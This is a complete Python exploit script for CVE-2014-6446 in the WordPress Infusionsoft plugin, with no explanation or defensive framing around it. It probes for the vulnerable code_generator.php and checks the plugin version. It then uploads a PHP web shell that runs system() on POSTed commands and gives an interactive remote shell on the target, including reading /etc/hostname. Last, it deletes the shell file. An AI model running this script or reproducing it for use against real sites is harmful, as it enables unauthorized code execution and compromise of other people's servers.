from argparse import ArgumentParser, RawTextHelpFormatter
import requests as http
from huepy import *
import re
import random
import string

F = "".join(random.choices(string.ascii_letters, k=13)) + ".php"
parser = ArgumentParser(description="Exploit for CVE-2014-6446")
parser.add_argument("--target",
                    "-t",
                    required=True,
                    help="target website with installation directory",
                    metavar="",
                    dest="t")
args = parser.parse_args()
if args.t.endswith("/"):
    args.t = args.t[:-1]

r = http.get(
    args.t +
    "/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php"
)
if r.status_code == 404:
    print(bad("Target file not found. Unable to exploit"))
    exit(1)

print(run("Checking if file exists"))
r = http.get(args.t + "/wp-content/plugins/infusionsoft/readme.txt")
if r.status_code != 404:
    html = r.content.decode()
    match: re.Match = re.search(r"1.5.(3|4|5|6|7|8|9|10)", html)
    if not match:
        print(bad("The version is not exploitable"))
        exit(1)
    else:
        print(good("Version is exploitable"))
else:
    print(info("Unable to find version"))

print(run("Exploiting"))
data = {
    "fileNamePattern": F,
    "fileTemplate": "<?php system($_POST['cmd']); ?>"
}
http.post(
    args.t +
    "/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php",
    data=data)

r = http.get(args.t +
             '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F)
if r.status_code == 404:
    print(bad("File not found"))
    exit(1)

print(good("Exploited"))
print(info("Spawning shell"))
r = http.post(args.t +
              '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F,
              data={"cmd": "whoami"})
user = http.post(
    args.t + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F,
    data={"cmd": "whoami"})
host = http.post(
    args.t + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F,
    data={"cmd": "cat /etc/hostname"})
shell = f"{lightgreen('%s@%s'%(user.content.decode().strip(), host.content.decode().strip()))}{blue('$ ')}"

while True:
    try:
        cmd = input(shell)
        if cmd == "exit": break
        r = http.post(
            args.t +
            '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F,
            data={"cmd": cmd})
        print(r.content.decode().strip(), end="")
    except:
        break
    print()
print(run("Cleaning"))
http.post(args.t +
          '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F,
          data={"cmd": "rm %s" % F})
r = http.get(args.t +
             '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/%s' % F)
if r.status_code == 404:
    print(good("Cleaned"))
else:
    print(bad("You need to manually clean the file. Filename: %s" % F))
